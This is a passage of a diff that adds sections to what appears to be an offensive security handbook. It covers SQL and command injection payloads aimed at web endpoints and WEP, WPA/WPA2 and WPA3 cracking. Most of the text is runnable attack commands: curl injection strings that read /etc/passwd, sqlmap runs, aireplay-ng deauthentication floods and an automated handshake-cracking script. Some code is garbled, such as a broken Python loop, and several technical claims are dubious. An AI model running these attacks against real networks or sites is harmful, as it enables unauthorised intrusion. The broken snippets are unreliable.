+curl "https://target.com/search?q=test' UNION SELECT user(),database(),version(),4--"
+
+# Extract table names
+curl "https://target.com/search?q=test' UNION SELECT table_name,2,3,4 FROM information_schema.tables--"
+
+# 6. Automated SQL injection testing
+sqlmap -u "https://target.com/search?q=test" -p q --dbs
+
+# Alternative parameters
+sqlmap -u "https://target.com/user?id=1" -p id --dbs
+
+# POST-based injection
+sqlmap -u "https://target.com/login" --data "username=test&password=test" -p username --dbs
+
+# Cookie-based injection
+sqlmap -u "https://target.com/dashboard" --cookie "sessionid=test" -p sessionid --dbs
+```
+
+[Inference] SQL injection severity ranges from information disclosure to complete database compromise, with exploitation success depending on database backend and application error handling.
+
+**Command Injection Testing**
+
+Identify arbitrary command execution vulnerabilities:
+
+```bash
+# 1. Basic command injection
+# Test with command separators
+
+curl "https://target.com/ping?host=example.com; id"
+curl "https://target.com/ping?host=example.com | whoami"
+curl "https://target.com/ping?host=example.com && cat /etc/passwd"
+curl "https://target.com/ping?host=example.com\`whoami\`"
+
+# 2. Blind command injection
+# No output displayed, but commands executed
+
+curl "https://target.com/process?file=test; touch /tmp/pwned"
+
+# Verify execution (if file access available)
+# Check if /tmp/pwned created
+
+# 3. Time-based command injection
+curl "https://target.com/process?file=test; sleep 5"
+
+# 4. Output redirection
+curl "https://target.com/process?file=test; id > /tmp/output"
+
+# 5. Environmental variable exploitation
+curl "https://target.com/process?file=$(whoami)"
+curl "https://target.com/process?file=$((1+1))"
+
+# 6. Null byte injection (bypasses filters)
+curl "https://target.com/process?file=test%00; whoami"
+
+# 7. Polyglot commands (work across multiple shells)
+# sh, bash, zsh compatible
+
+curl "https://target.com/ping?host=example.com$(touch /tmp/pwned)$(touch /tmp/pwned2)"
+
+# 8. Escape sequence bypasses
+# Bypass input filters
+
+# Spaces bypass
+curl "https://target.com/ping
+```
+
+# TBC Brave
+
+---
+
 # Remote Access via Valid Credentials
 
 ## SSH Access
@@ -3858,3 +19985,21208 @@ run
 - Active Directory Enumeration and Exploitation
 - Advanced Persistence Mechanisms (Rootkits, Bootkits)
 - Memory-Only Malware and Fileless Techniques
+
+---
+
+# Wireless Network Access
+
+## WEP Cracking
+
+WEP (Wired Equivalent Privacy) cracking exploits fundamental cryptographic weaknesses in the WEP protocol, enabling rapid key recovery and network access through IV reuse, weak key scheduling, and predictable keystream patterns.
+
+**Wireless Network Discovery and Reconnaissance**
+
+Identify WEP-secured networks requiring target selection and signal analysis:
+
+```bash
+# Passive network scanning
+iw dev wlan0 set type monitor
+ip link set wlan0 up
+
+airodump-ng wlan0
+airodump-ng --band a wlan0
+airodump-ng --channel 1-13 wlan0
+
+# Targeted network monitoring
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
+```
+
+Output analysis identifies:
+
+- BSSID: Access Point MAC address
+- SSID: Network name
+- CH: Channel number (1-14 for 2.4GHz, varies by region)
+- ENC: Encryption type (WEP displays as "WEP")
+- CIPHER: Encryption algorithm (WEP uses RC4)
+- PWR: Signal strength (negative dBm, closer to 0 = stronger)
+- Beacons: Management frames count
+- IV: Initialization Vector count
+
+[Inference] WEP networks display encryption type "WEP" in airodump output, enabling rapid identification for targeted attacks before beginning capture or crack procedures.
+
+**Initialization Vector (IV) Collection**
+
+Capture IVs for keystream analysis and recovery:
+
+```bash
+# Capture traffic to file
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
+
+# Monitor capture progress
+# Output displays IV count incrementing during capture
+# Typically require 100,000-1,000,000+ IVs for successful key recovery
+
+# Alternative using tcpdump
+tcpdump -i wlan0 -w capture.pcap "wlan type mgt and (wlan.fc.subtype == 0x08 or wlan.fc.subtype == 0x04)"
+
+# Analyze captured data
+wireshark capture.pcap
+```
+
+[Inference] IV collection rate depends on network activity—active networks transmitting numerous packets enable faster IV accumulation, while passive networks may require extended capture periods or traffic injection to accelerate collection.
+
+**Traffic Generation for IV Acceleration**
+
+Inject or replay traffic to increase IV generation rate:
+
+```bash
+# Associate with network (if network permits)
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+# -1: Fake authentication
+# -0: Wait indefinitely for beacon
+# -a: Access point BSSID
+# -h: Source MAC
+
+# ARP request replay (generates many IVs)
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+# -3: ARP request replay
+# Listens for ARP packets and replays them
+# Each ARP packet generates multiple IVs
+
+# Accelerated mode (aggressive IV generation)
+aireplay-ng -3 -x 128 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+# -x 128: Transmit 128 bytes per second
+```
+
+[Unverified] ARP replay attacks assume ARP traffic exists on the network—completely isolated networks may not generate sufficient ARP packets for acceleration, though most connected networks transmit periodic ARP requests enabling this technique.
+
+**WEP Key Recovery**
+
+Crack the WEP key using collected IVs:
+
+```bash
+# Using aircrack-ng
+aircrack-ng capture-01.cap
+# Performs statistical analysis on collected IVs
+# Output displays recovered key in hexadecimal and ASCII
+
+# Specify network BSSID
+aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+# Specify key length
+aircrack-ng -l 64 capture-01.cap  # 64-bit WEP
+aircrack-ng -l 128 capture-01.cap # 128-bit WEP
+aircrack-ng -l 256 capture-01.cap # 256-bit WEP
+
+# Output format
+# [00:00:00] Tested 1234567 keys, 0.24 keys/sec
+# KEY FOUND! [ AA:BB:CC:DD:EE ]
+```
+
+[Inference] WEP key recovery success depends on sufficient IV collection—typically 100,000-300,000 IVs enable reliable key recovery using statistical attacks exploiting FMS (Fluhrer, Mantin, and Shamir) vulnerability in WEP key scheduling.
+
+**WEP Key Application and Access**
+
+Use recovered keys to access the network:
+
+```bash
+# Manual configuration
+# Add network profile with recovered key
+
+# Using airolib-ng database integration
+airolib-ng wepdb --import essid networks.txt
+airolib-ng wepdb --import passwd wordlist.txt
+aircrack-ng -r wepdb capture-01.cap
+
+# Connect to network with key
+nmcli device wifi connect "SSID" password "AA:BB:CC:DD:EE" --ask
+# Alternative with wpa_supplicant
+wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211
+
+# Verify connectivity
+iwconfig wlan0
+ip addr show
+```
+
+Configuration file for WEP connection (wpa_supplicant.conf):
+
+```
+network={
+    ssid="TargetWEP"
+    key_mgmt=NONE
+    wep_key0="HEXKEY"
+    wep_tx_keyidx=0
+}
+```
+
+[Inference] Successfully recovered WEP keys function identically to legitimate credentials, enabling full network access as if the attacker possessed the original key.
+
+**WEP with Weak Key Analysis**
+
+Exploit WEP weak key scheduling vulnerability:
+
+```bash
+# Statistical analysis identifies weak IVs
+# Weak IVs correlate with specific key bytes
+# FMS attack exploits this correlation
+
+# Direct weak IV targeting
+aircrack-ng -f 2 capture-01.cap  # Use only weak IVs
+# -f 2: KoreK implementation (faster, newer weak IV detection)
+
+# Output shows accelerated recovery with fewer IVs required
+# Weak IVs: 5000
+# Keys tested: 50000
+# Time: <1 minute
+```
+
+[Inference] Weak IV targeting reduces IV requirements from 100,000+ to 5,000-10,000 by focusing analysis on IVs statistically correlated with specific key bytes, dramatically accelerating key recovery.
+
+**WEP Cracking with Dictionary Attack Integration**
+
+Combine WEP cracking with password dictionaries:
+
+```bash
+# Create dictionary from potential keys
+echo -e "password123\nwelcome\nadmin" > wep_wordlist.txt
+
+# Hex convert and test against capture
+aircrack-ng -w wep_wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+# Rainbow table integration
+# Pre-compute WEP key hashes for common passwords
+airolib-ng wepdb --import essid networks.txt
+airolib-ng wepdb --import passwd wep_wordlist.txt
+aircrack-ng -r wepdb capture-01.cap
+```
+
+[Unverified] Dictionary-based WEP cracking enables rapid recovery when administrators use dictionary words or common patterns as WEP keys, though [Inference] random keys remain vulnerable to statistical attacks regardless of randomness.
+
+**WEP Client Authentication Analysis**
+
+Exploit weak client authentication:
+
+```bash
+# Capture client authentication frames
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w auth_capture wlan0
+
+# Monitor for client association
+# Authentication happens before association
+
+# Deauthentication attack (force re-authentication)
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0
+# -0: Deauthentication
+# 10: Number of deauth packets
+# -a: Access point BSSID
+# -c: Client MAC to deauthenticate
+
+# Client re-authenticates, generating new authentication frames
+# Analysis of authentication reveals WEP key information
+```
+
+[Inference] Client authentication attacks force credential resubmission in observable plaintext-like formats, enabling [Inference] key recovery from authentication exchanges rather than standard encrypted traffic.
+
+**WEP Cracking Troubleshooting**
+
+Address common WEP cracking issues:
+
+```bash
+# Insufficient IV collection
+# Monitor IV rate and increase if necessary
+# aircrack-ng requires minimum 100,000 IVs for reliable recovery
+# Some implementations require 300,000+
+
+# No traffic on network
+# Use aireplay-ng to generate traffic
+# ARP replay requires existing ARP packets to work
+
+# Authentication fails before replay
+# Use fake authentication to associate
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+
+# Verify monitor mode active
+iwconfig wlan0
+# Output should show "Mode:Monitor"
+
+# Check capture file integrity
+aircrack-ng capture-01.cap --list-aeskeys  # Verify readable
+```
+
+[Inference] WEP cracking failures typically result from insufficient IV collection or network association issues rather than cryptographic implementation, requiring procedural adjustments rather than technical bypass.
+
+**WEP Network Authentication Bypass**
+
+Bypass open authentication for networks requiring it:
+
+```bash
+# Some WEP networks use authentication despite encryption
+# Open authentication phase before WEP encryption
+
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+# -1 0: Fake open authentication (0 means no authentication type)
+
+# Shared key authentication (requires WEP key first)
+# Not applicable during initial key recovery
+
+# Proceed with traffic capture and cracking
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
+```
+
+[Inference] Open authentication on WEP networks enables association without prior key knowledge, allowing IV collection and statistical key recovery without password submission.
+
+---
+
+## WPA/WPA2 Cracking
+
+WPA/WPA2 cracking exploits weak pre-shared keys (PSK) through dictionary attacks against handshake hashes or exploits protocol vulnerabilities enabling keystream recovery and packet decryption.
+
+**WPA/WPA2 Network Reconnaissance**
+
+Identify WPA/WPA2-secured networks for targeted attacks:
+
+```bash
+# Monitor for WPA networks
+airodump-ng wlan0
+# ENC column displays "WPA2" or "WPA2/WPA"
+# CIPHER column shows "CCMP" (AES) or "TKIP"
+
+# Target specific network
+airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0
+```
+
+Network security indicators:
+
+- **CIPHER: CCMP** — AES encryption (modern, stronger)
+- **CIPHER: TKIP** — TKIP encryption (legacy, weaker)
+- **AUTH: PSK** — Pre-shared key (password-based)
+- **AUTH: MGT** — Management frame protection
+
+[Inference] TKIP/WPA networks are technically weaker than CCMP/WPA2, though both remain vulnerable to weak password cracking through handshake dictionary attacks.
+
+**Four-Way Handshake Capture**
+
+Capture WPA four-way handshake for offline cracking:
+
+```bash
+# Capture continuously waiting for handshake
+airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0
+
+# Handshake detected when client connects
+# Output shows "[WPA Handshake: AA:BB:CC:DD:EE:FF]" when successful
+
+# Accelerate handshake capture through deauthentication
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0
+# -0: Deauthentication
+# 5: Number of deauth packets
+# Clients re-authenticate, handshake captured
+
+# Targeted deauthentication of specific client
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0
+# -c: Target client MAC
+```
+
+[Inference] Deauthentication attacks force client re-connection to the network, generating handshakes observable by adjacent attackers during capture window.
+
+**WPA Handshake Processing**
+
+Extract handshake for offline analysis:
+
+```bash
+# Verify handshake in capture file
+aircrack-ng wpa_capture-01.cap
+# Output shows:
+# "No targets found in file!"  (no handshake)
+# or
+# "1 handshake found"  (successful capture)
+
+# Extract handshake to separate file
+aircrack-ng -J wpa_handshake wpa_capture-01.cap
+# Creates wpa_handshake.hccapx (Hashcat format)
+
+# Convert to John format if needed
+cap2hccapx.bin wpa_capture-01.cap wpa_handshake.hccapx
+```
+
+Handshake components captured:
+
+- Message 1 (M1): Nonce from AP
+- Message 2 (M2): Nonce from client, MIC hash
+- Message 3 (M3): Encrypted key material
+- Message 4 (M4): Client confirmation MIC
+
+[Inference] All four messages enable offline WPA password cracking by verifying dictionary candidates against captured MIC hashes, requiring only one complete handshake for dictionary attack execution.
+
+**Dictionary Attack Against WPA Handshake**
+
+Crack WPA PSK through password dictionary brute-force:
+
+```bash
+# Using aircrack-ng
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
+# -w: Wordlist file
+# -b: Network BSSID (optional for single network captures)
+
+# Using hashcat
+hashcat -m 22000 wpa_handshake.hccapx wordlist.txt
+# -m 22000: WPA2-PSK format
+
+# Using john the ripper
+john --format=wpapsk --wordlist=wordlist.txt wpa_handshake.hccapx
+
+# GPU acceleration (Hashcat)
+hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -d 1 --workload-profile 4
+```
+
+Dictionary attack process:
+
+1. For each candidate password: Calculate PMK (PBKDF2-SHA1)
+2. Calculate PTK (derived from PMK)
+3. Calculate MIC (HMAC-MD5 or HMAC-SHA1)
+4. Compare against captured MIC
+5. If match found, password recovered
+
+[Inference] WPA dictionary attacks succeed when administrator-configured passwords exist in wordlist or derive from predictable patterns, with success rates varying 5-95% depending on wordlist comprehensiveness and password strength.
+
+**Optimized Dictionary Attack Techniques**
+
+Improve cracking efficiency through optimization:
+
+```bash
+# Mask attack (Hashcat)
+# Attack passwords matching specific pattern
+hashcat -m 22000 wpa_handshake.hccapx -a 3 "Password?d?d?d?d"
+# ?d = digit, ?u = uppercase, ?l = lowercase
+
+# Rule-based attack
+# Apply transformation rules to dictionary words
+hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -r rules.txt
+
+# Rules example (capitalize, append digit)
+c $1 $2 $3 $4
+# Capitalizes first letter, appends digits 1234
+
+# Hybrid attack (combine wordlist + mask)
+hashcat -m 22000 wpa_handshake.hccapx wordlist.txt -a 6 "?d?d?d?d"
+# Tests wordlist + 4-digit suffix combinations
+
+# Distributed cracking (multiple systems)
+# Split wordlist across systems
+split -l 1000000 wordlist.txt wordlist_part_
+# Process on multiple machines
+hashcat -m 22000 wpa_handshake.hccapx wordlist_part_aa --restore
+```
+
+[Inference] Advanced cracking techniques reduce computation requirements from full keyspace (2^128 combinations) to targeted subsets, accelerating cracking speed 10-100x depending on optimization method and target password characteristics.
+
+**Rainbow Table Attacks Against WPA**
+
+Pre-computed hash tables for rapid WPA cracking:
+
+```bash
+# Generate rainbow tables for common SSIDs
+genpmk -f wordlist.txt -d rainbowtable_ssid -s "TargetSSID"
+# Generates pre-computed PMK values for all wordlist entries
+
+# Use rainbow tables for cracking
+cowpatty -d rainbowtable_ssid -s "TargetSSID" -r wpa_capture.cap
+
+# Online rainbow table lookup
+# Services like WirelessKey.com provide SSID-specific tables
+# Download relevant table and perform lookup
+
+# Verify table usefulness
+coWPAtty -c -d rainbowtable_ssid
+# Lists SSID coverage in rainbow table database
+```
+
+[Unverified] Pre-computed rainbow tables enable [Inference] single-pass WPA cracking in seconds-minutes when SSID-specific tables are available, though generation requires significant storage (50GB+ for comprehensive tables) and only benefits password sets already in tables.
+
+**WPA Cracking with Wordlist Optimization**
+
+Optimize wordlists for target environment:
+
+```bash
+# Generate environment-specific wordlist
+# User organization: Acme Corp
+# Likely passwords: Acme2024!, AcmeCorp, etc.
+
+# Using crunch for pattern generation
+crunch 8 16 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()" -o wordlist_large.txt
+
+# Leverage historical breaches
+# Download breach databases (rockyou.txt, etc.)
+curl -L https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt -o rockyou.txt
+
+# Combine multiple wordlists
+cat wordlist1.txt wordlist2.txt wordlist3.txt > combined.txt
+sort -u combined.txt > combined_unique.txt
+
+# Prioritize by frequency (most common passwords first)
+sort combined.txt | uniq -c | sort -rn | awk '{print $2}' > priority_wordlist.txt
+```
+
+[Inference] Target-specific wordlists increase cracking success probability by focusing on passwords likely within organizational environment or common patterns relevant to target context.
+
+**WPA TKIP Vulnerability Exploitation**
+
+Exploit TKIP weaknesses for accelerated cracking:
+
+```bash
+# TKIP networks identifiable by CIPHER field
+airodump-ng wlan0 | grep TKIP
+
+# TKIP uses RC4 with per-packet key derivation
+# Vulnerability: Phase 2 key scheduling weaknesses enable key recovery
+
+# Aircrack-ng optimization for TKIP
+aircrack-ng -f 3 wpa_tkip_capture.cap
+# -f 3: Use advanced TKIP-specific attacks
+
+# Packet collection acceleration
+# TKIP requires fewer unique IVs than modern WPA2/CCMP
+# Dictionary attacks still applicable but less reliable
+```
+
+[Unverified] TKIP vulnerabilities enable [Inference] cryptographic attacks beyond dictionary brute-force when sufficient keyed packets are collected, though most practical attacks remain dictionary-based as cryptographic recovery is computationally intensive.
+
+**WPA/WPA2 Enterprise (802.1X) Attacks**
+
+Target enterprise WPA with alternative vectors:
+
+```bash
+# Enterprise WPA uses RADIUS authentication
+# Not vulnerable to PSK dictionary attacks
+# Alternatives:
+
+# 1. Client certificate capture
+# Intercept RADIUS authentication traffic (unencrypted initially)
+tcpdump -i wlan0 -w radius_capture.pcap "port 1812 or port 1813"
+
+# 2. Evil AP impersonation (covered in Evil Twin section)
+# Clients may connect to rogue RADIUS requesting credentials
+
+# 3. Dictionary attack on captured EAP-MD5
+# Some implementations use weak EAP methods
+aircrack-ng wpa_enterprise.cap -w wordlist.txt
+# Limited success compared to PSK attacks
+
+# 4. RADIUS server compromise
+# Direct compromise of authentication backend
+```
+
+[Inference] Enterprise WPA exploits typically require network positioning (MITM) or infrastructure compromise rather than captured traffic analysis, making dictionary attacks ineffective compared to PSK cracking.
+
+**WPA3 Backward Compatibility Attacks**
+
+Exploit WPA3 networks falling back to WPA2:
+
+```bash
+# Identify WPA3 networks
+airodump-ng wlan0 | grep WPA3
+
+# Some implementations support WPA2/WPA3 mixed mode
+# Clients may downgrade to WPA2 if WPA3 unavailable
+
+# KRACK attack (Key Reinstallation Attack)
+# Against WPA2/WPA3 implementations with vulnerable key reinstallation
+
+# Deauthenticate clients
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0
+
+# Capture re-authentication using downgrade
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_downgrade wlan0
+
+# Proceed with WPA2 dictionary attack
+aircrack-ng wpa2_downgrade-01.cap -w wordlist.txt
+```
+
+[Unverified] WPA3 downgrade attacks require [Inference] specific network configurations supporting backward compatibility, with most modern deployments enforcing WPA3-only mode preventing downgrade exploitation.
+
+**WPA Cracking Automation and Orchestration**
+
+Automate WPA cracking workflows:
+
+```bash
+#!/bin/bash
+# Automated WPA cracking pipeline
+
+TARGET_BSSID="AA:BB:CC:DD:EE:FF"
+CHANNEL=11
+WORDLIST="wordlist.txt"
+OUTPUT_DIR="./wpa_cracks"
+
+mkdir -p $OUTPUT_DIR
+
+# 1. Capture handshake
+echo "[*] Capturing handshake..."
+airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w $OUTPUT_DIR/capture wlan0 &
+CAPTURE_PID=$!
+
+# Wait for handshake or timeout after 5 minutes
+for i in {1..300}; do
+    if grep -q "WPA Handshake" $OUTPUT_DIR/capture-01.csv 2>/dev/null; then
+        echo "[+] Handshake captured!"
+        kill $CAPTURE_PID
+        break
+    fi
+    sleep 1
+done
+
+# 2. Deauthenticate to force handshake
+aireplay-ng -0 10 -a $TARGET_BSSID wlan0
+
+# 3. Wait for re-authentication
+sleep 10
+
+# 4. Perform dictionary attack
+echo "[*] Attempting dictionary attack..."
+hashcat -m 22000 $OUTPUT_DIR/capture.hccapx $WORDLIST -o $OUTPUT_DIR/results.txt
+
+# 5. Check results
+if [ -f $OUTPUT_DIR/results.txt ]; then
+    echo "[+] Password cracked!"
+    cat $OUTPUT_DIR/results.txt
+else
+    echo "[-] Dictionary attack failed"
+fi
+```
+
+[Inference] Automated workflows accelerate WPA cracking campaigns by eliminating manual steps and enabling parallel processing across wordlists or multiple networks simultaneously.
+
+---
+
+## WPA3 Attacks
+
+WPA3 attacks exploit protocol vulnerabilities, side-channel weaknesses, or configuration misimplementations in the newest WiFi security standard, including Dragonblood vulnerability and downgrade attacks.
+
+**WPA3 Protocol Overview and Identification**
+
+Identify and analyze WPA3-protected networks:
+
+```bash
+# Network detection with WPA3
+airodump-ng wlan0 | grep -i wpa3
+# ENC column displays "WPA3" or "WPA2/WPA3"
+
+# Targeted WPA3 network monitoring
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_capture wlan0
+
+# Detailed analysis with extended display
+airodump-ng wlan0 -C a  # Analyze 5GHz band (WPA3 common)
+
+# Protocol version verification via pcap analysis
+tcpdump -r wpa3_capture.cap -nn "wlan.fc.type == 0 and wlan.fc.subtype == 0" | head -20
+```
+
+WPA3 identifiers:
+
+- **RSN IE (Robust Security Network)**: Contains WPA3 authentication suites
+- **SAE (Simultaneous Authentication of Equals)**: WPA3 key exchange mechanism
+- **OWE (Opportunistic Wireless Encryption)**: WPA3 open network variant
+
+[Inference] WPA3 identification requires deep packet inspection of management frames to detect presence, as ENC display may combine WPA2/WPA3 when mixed-mode networks are configured.
+
+**Dragonblood Vulnerability (CVE-2019-9494, CVE-2019-9496)**
+
+Exploit side-channel vulnerabilities in WPA3 SAE implementation:
+
+```bash
+# Dragonblood vulnerabilities affect SAE implementations
+# Two main variants:
+
+# 1. Timing side-channel (affects password-based SAE)
+# Attack: Measure password verification timing differences
+# Vulnerable: Implementations with non-constant-time comparisons
+
+# 2. Cache-based side-channel (affects password derivation)
+# Attack: Exploit CPU cache timing for password byte recovery
+# Vulnerable: Systems with inadequate constant-time implementation
+
+# Practical exploitation requires:
+# - Proximity to target network (side-channel measurement)
+# - Multiple authentication attempts (statistical analysis)
+# - Detailed timing measurements (microsecond precision)
+
+# Timing attack framework (conceptual)
+python3 << 'EOF'
+import time
+from scapy.all import *
+
+target_bssid = "AA:BB:CC:DD:EE:FF"
+channel = 6
+
+for password_candidate in password_list:
+    # Measure authentication attempt timing
+    start_time = time.time_ns()
+    
+    # Send SAE authentication frame
+    # (Conceptual - actual SAE frame construction complex)
+    
+    timing = time.time_ns() - start_time
+    
+    # Analyze timing variations
+    # Correct password bytes produce detectable timing patterns
+    if timing > threshold:
+        print(f"Timing anomaly for: {password_candidate}")
+EOF
+```
+
+[Unverified] Dragonblood timing attacks are [Inference] theoretically exploitable under optimal conditions with precise measurement equipment, though [Unverified] practical exploitation difficulty remains high due to noise, network latency, and implementation variations.
+
+**KRACK Attack (Key Reinstallation Attack) on WPA3**
+
+Exploit key reinstallation vulnerabilities in WPA3 implementations:
+
+```bash
+# KRACK exploits four-way handshake vulnerabilities
+# Affects WPA2 primarily, some WPA3 implementations vulnerable
+
+# Attack mechanism:
+# 1. Deauthenticate client from AP
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
+
+# 2. Create position for MITM between client and AP
+# Attacker becomes transparent relay
+
+# 3. Block or delay fourth message of four-way handshake
+# Forces client key reinstallation
+
+# 4. Inject packets with reinstalled keys
+# Exploit nonce counter reset or IV reuse
+
+# Practical KRACK exploitation requires:
+# - Precise packet timing and manipulation
+# - Ability to intercept and modify frames
+# - Understanding of target device cryptography implementation
+
+# Detection of KRACK vulnerability
+# Monitor for unexpected key reinstallation events
+tcpdump -i wlan0 -w krack_analysis.pcap "wlan.frame_control.type == 0"
+
+# Analyze for duplicate message detection
+tshark -r krack_analysis.pcap -Y "wlan.fixed.timestamp" | sort | uniq -d
+```
+
+[Unverified] KRACK attacks on WPA3 are [Inference] largely mitigated by modern implementations due to widespread patching, though [Unverified] some devices remain vulnerable if firmware updates are not applied.
+
+**WPA3 Downgrade Attacks**
+
+Force WPA3 networks to downgrade to WPA2 for established attacks:
+
+```bash
+# Identify mixed-mode WPA3/WPA2 networks
+airodump-ng wlan0 | grep "WPA2/WPA3"
+
+# WPA3 personal typically uses SAE; WPA2 uses PSK
+# Some implementations permit downgrade on client request
+
+# Deauthenticate clients repeatedly
+for i in {1..20}; do
+    aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
+    sleep 2
+done
+
+# Monitor for downgrade events
+# Client may fallback to WPA2 after failed WPA3 attempts
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w downgrade_capture wlan0
+
+# Upon successful downgrade, capture four-way handshake
+# Proceed with WPA2 dictionary attack
+aircrack-ng downgrade_capture-01.cap -w wordlist.txt
+```
+
+[Inference] WPA3 downgrade attacks succeed when networks support dual-mode authentication and clients prioritize connectivity over security, though modern WPA3 implementations disable WPA2 fallback by default.
+
+**SAE (Simultaneous Authentication of Equals) Dictionary Attack**
+
+Target WPA3 SAE implementation weaknesses:
+
+```bash
+# SAE replaces PSK pre-shared key mechanism
+# Conceptual attacks on SAE:
+
+# 1. Captured SAE frames contain authentication material
+# Unlike PSK (no four-way handshake), SAE exchanges visible
+
+# 2. SAE commit/confirm frame capture
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0
+
+# Monitor for SAE authentication attempts
+# SAE frames identifiable by specific IE fields
+
+# 3. Offline SAE recovery (if vulnerability exists)
+# SAE dictionary attacks not standard due to protocol design
+# Protocol designed to resist offline password cracking
+
+python3 << 'EOF'
+# SAE recovery conceptual framework
+# Standard attacks on SAE not feasible with current implementations
+# Would require:
+# - Cryptographic weakness in SAE algorithm (unknown as of knowledge cutoff)
+# - Side-channel exploitation (Dragonblood type)
+# - Protocol flaw enabling brute-force
+EOF
+```
+
+[Unverified] SAE design specifically addresses WPA2 PSK weaknesses, providing [Inference] resistance against offline dictionary attacks that dominated WPA2 cracking, making standard SAE password cracking infeasible with current attack methods.
+
+**WPA3 Opportunistic Wireless Encryption (OWE) Attacks**
+
+Exploit OWE open network variant:
+
+```bash
+# OWE provides encryption without authentication
+# Intended for open networks (hotels, cafes)
+
+# Identify OWE networks
+airodump-ng wlan0 | grep -i "OWE"
+
+# OWE handshake capture
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w owe_capture wlan0
+
+# OWE uses Diffie-Hellman key exchange
+# No pre-shared secret involved
+
+# Attack vectors:
+
+# 1. MITM attack (network positioning required)
+# Attacker intercepts DH exchange
+
+# 2. Known cryptographic weaknesses in DH implementation
+# Requires specific vulnerable group selection
+
+# 3. Side-channel attacks on DH computation
+tcpdump -i wlan0 -w owe_analysis.pcap "wlan.type == 0 and wlan.subtype == 8"
+
+# Analyze timing of DH computations
+# Statistical patterns may leak information
+
+# 4. Downgrade to unencrypted if supported
+# Some implementations permit disabling encryption
+```
+
+[Inference] OWE attacks remain limited compared to PSK attacks due to lack of password basis—exploitation typically requires MITM positioning or cryptographic implementation flaws rather than password recovery.
+
+**WPA3 Brute-Force Resistance Analysis**
+
+Analyze WPA3 anti-brute-force mechanisms:
+
+```bash
+# WPA3 implements SAE anti-brute-force through backoff
+# Failed authentications trigger increasing backoff timers
+
+# Measure anti-brute-force behavior
+import time
+
+for attempt in range(1, for attempt in range(1, 100): start = time.time()
+
+# Attempt authentication with wrong password
+# (Conceptual - actual implementation varies)
+
+backoff_delay = time.time() - start
+
+# Delay increases exponentially
+# After N failed attempts: delay = 2^attempt * base_delay
+
+print(f"Attempt {attempt}: {backoff_delay}s backoff")
+
+if backoff_delay > 3600:  # Over 1 hour
+    print("Brute-force protection activated - further attempts blocked")
+    break
+
+time.sleep(backoff_delay)
+````
+
+[Inference] WPA3 SAE anti-brute-force mechanisms make password guessing impractical by exponentially increasing delays between authentication attempts, preventing rapid dictionary attack exploitation compared to WPA2 lack of rate limiting.
+
+**WPA3 Configuration and Implementation Flaws**
+
+Exploit misconfigured WPA3 deployments:
+
+```bash
+# Network surveying for configuration weaknesses
+airodump-ng -C a wlan0 > network_survey.txt
+
+# Common WPA3 misconfigurations:
+
+# 1. WPA3-only with weak password
+# SAE protection bypassed by dictionary attacks through protocol analysis
+
+# 2. Mixed WPA2/WPA3 mode with WPA2 downgrade allowed
+# Clients unable to establish WPA3 connection fallback to WPA2
+
+# 3. WPA3 Personal with client isolation disabled
+# Enables inter-client attacks
+
+# 4. Default or manufacturer credentials
+# Some enterprise WPA3 implementations ship with defaults
+
+# Identify and target misconfigurations
+for ssid in $(cat ssid_list.txt); do
+    # Test for WPA2 downgrade
+    aireplay-ng -0 10 -a $BSSID wlan0
+    
+    # Monitor for authentication attempt
+    # Capture any fallback to WPA2
+    airodump-ng -c 6 --bssid $BSSID -w downgrade_test wlan0
+done
+````
+
+[Inference] WPA3 security improvements become ineffective when configurations permit backward compatibility or weak password selection, requiring security enforcement through policy rather than protocol alone.
+
+**WPA3 Transition Mode Attacks**
+
+Target networks supporting both WPA3 and older standards:
+
+```bash
+# Identify transition/mixed mode networks
+airodump-ng wlan0 | grep -E "WPA3.*WPA2|WPA2.*WPA3"
+
+# Transition mode enables gradual client migration
+# Creates temporary vulnerability window
+
+# Attack procedure:
+
+# 1. Enumerate clients attempting WPA3 connection
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w client_monitor wlan0
+
+# 2. Deauthenticate WPA3-capable client
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
+
+# 3. Create rogue WPA2 SSID matching legitimate network
+# (Evil Twin - see section below)
